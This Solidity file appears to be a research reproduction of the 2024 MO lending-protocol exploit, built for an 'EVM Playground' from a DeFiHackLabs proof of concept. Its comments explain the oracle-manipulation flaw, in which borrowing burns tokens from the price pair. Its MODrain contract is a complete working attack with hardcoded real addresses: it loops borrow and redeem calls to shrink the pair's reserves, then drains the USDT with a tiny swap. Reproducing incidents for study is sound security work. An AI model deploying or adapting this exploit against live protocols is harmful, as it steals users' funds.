// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-MO).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (contractTest.testExploit()) — attacker == address(this), no standalone exploit
// contract is deployed for the attack path (the `Money` helper is dead code left
// over from an abandoned referrer-bind attempt). This contract is a faithful,
// self-contained copy of that inline attack so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from test/MO_exp.sol.
//
// Root cause: Loan.price() reads the live MO/USDT UniswapV2 reserve ratio as its
// collateral oracle, but Loan.borrow() itself burns 90% of the borrowed MO straight
// out of that same pair and sync()s — so every borrow raises price() with no
// external swap. redeem() then returns the FULL MO collateral (redeemRate = 10000)
// for repaying just the USDT principal, so the same MO can be recycled through
// borrow->redeem over and over, each cycle shrinking the pair's MO reserve further
// and inflating price(). The attacker seeds ~62.15M MO (deal, not otherwise
// obtainable) and loops borrow/redeem to grind the pair's MO reserve down, then
// takes one final un-redeemed borrow at the degenerate price and drains the
// remaining USDT with a 3-wei MO swap.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ILoan {
    function borrow(uint256 amount, uint256 duration) external;
    function redeem(uint256 index) external;
    function borrowOrdersCount(address account) external view returns (uint256);
}

interface IUniRouterV2 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract MODrain {
    IERC20 constant MO = IERC20(0x61445Ca401051c86848ea6b1fAd79c5527116AA1);
    IERC20 constant USDT = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    ILoan constant LOAN = ILoan(0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E);
    address constant APPROVE_PROXY = 0x9D8355a8D721E5c79589ac0aB49BC6d3e0eF7C3F;
    IUniRouterV2 constant ROUTER = IUniRouterV2(0x9eADD135641f8b8cC4E060D33d63F8245f42bE59);

    uint256 private moBalance;

    // The `deal(MO, address(this), 62_147_724)` seeding step from testExploit()
    // is replicated as a `setup.steps: [{ kind: "dealToken", ... }]` in the
    // playground config, NOT here — it happens before this recorded entrypoint.
    function run() external {
        MO.approve(address(APPROVE_PROXY), type(uint256).max);
        USDT.approve(address(APPROVE_PROXY), type(uint256).max);
        moBalance = MO.balanceOf(address(this));

        uint256 i = 0;
        while (i < 80) {
            try this.doSomeBorrow(i) {} catch {
                break;
            }
            i++;
        }

        LOAN.borrow(MO.balanceOf(address(0x4a6E0fAd381d992f9eB9C037c8F78d788A9e8991)) - 1, 0);

        MO.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(MO);
        path[1] = address(USDT);
        MO.transfer(address(ROUTER), 10); // need some token for the pair to `sync()` against.
        ROUTER.swapExactTokensForTokens(3, 0, path, address(this), block.timestamp + 100);
    }

    function doSomeBorrow(uint256 i) public {
        LOAN.borrow(moBalance, 0);
        LOAN.redeem(i);
    }
}
